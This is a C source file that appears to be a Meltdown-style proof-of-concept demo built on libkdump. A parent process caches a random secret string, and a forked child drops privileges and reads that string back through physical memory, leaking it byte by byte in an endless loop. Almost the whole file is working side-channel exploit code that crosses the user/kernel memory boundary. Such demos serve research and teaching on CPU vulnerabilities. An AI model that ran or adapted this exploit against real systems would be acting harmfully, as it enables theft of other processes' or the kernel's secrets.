#include "libkdump.h"
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

void reader(char *, char *);

void reader(char * address, char * kaslr_offset) {
  size_t phys;
  

  phys = strtoull(address, NULL, 0);

  libkdump_config_t config;
  config = libkdump_get_autoconfig();
  if (kaslr_offset != NULL) {
    config.physical_offset = strtoull(kaslr_offset, NULL, 0);
  }

  libkdump_init(config);

  size_t vaddr = libkdump_phys_to_virt(phys);

  printf("\x1b[32;1m[+]\x1b[0m Physical address       : \x1b[33;1m0x%zx\x1b[0m\n", phys);
  printf("\x1b[32;1m[+]\x1b[0m Physical offset        : \x1b[33;1m0x%zx\x1b[0m\n", config.physical_offset);
  printf("\x1b[32;1m[+]\x1b[0m Reading virtual address: \x1b[33;1m0x%zx\x1b[0m\n\n", vaddr);

  while (1) {
    int value = libkdump_read(vaddr);
    printf("%c", value);
    fflush(stdout);
    vaddr++;
  }

  libkdump_cleanup();

}

const char *strings[] = {
    "If you can read this, this is really bad",
    "Burn after reading this string, it is a secret string",
    "Congratulations, you just spied on an application",
    "Wow, you broke the security boundary between user space and kernel",
    "Welcome to the wonderful world of microarchitectural attacks",
    "Please wait while we steal your secrets...",
    "Don't panic... But your CPU is broken and your data is not safe",
    "How can you read this? You should not read this!"};

int main(int argc, char *argv[]) {
  libkdump_config_t config;
  config = libkdump_get_autoconfig();
  libkdump_init(config);

  srand(time(NULL));
  const char *secret = strings[rand() % (sizeof(strings) / sizeof(strings[0]))];
  int len = strlen(secret);

  printf("\x1b[32;1m[+]\x1b[0m Secret: \x1b[33;1m%s\x1b[0m\n", secret);

  size_t paddr = libkdump_virt_to_phys((size_t)secret);
  if (!paddr) {
    printf("\x1b[31;1m[!]\x1b[0m Program requires root privileges (or read access to /proc/<pid>/pagemap)!\n");
    libkdump_cleanup();
    exit(1);
  }

  printf("\x1b[32;1m[+]\x1b[0m Physical address of secret: \x1b[32;1m0x%zx\x1b[0m\n", paddr);
  //printf("\x1b[32;1m[+]\x1b[0m Exit with \x1b[37;1mCtrl+C\x1b[0m if you are done reading the secret\n");


  char * formatted_address = (char *)malloc(12 * sizeof(char));
  sprintf(formatted_address, "0x%zx", paddr);
	
  int pid = fork(); 

  if (pid == 0) {
    setuid(1000);
    reader(formatted_address, argv[1]);
    return 0;
  }

  while (1) {
    // keep string cached for better results
    volatile size_t dummy = 0, i;
    for (i = 0; i < len; i++) {
      dummy += secret[i];
    }
    sched_yield();
  }

  libkdump_cleanup();

  return 0;
}

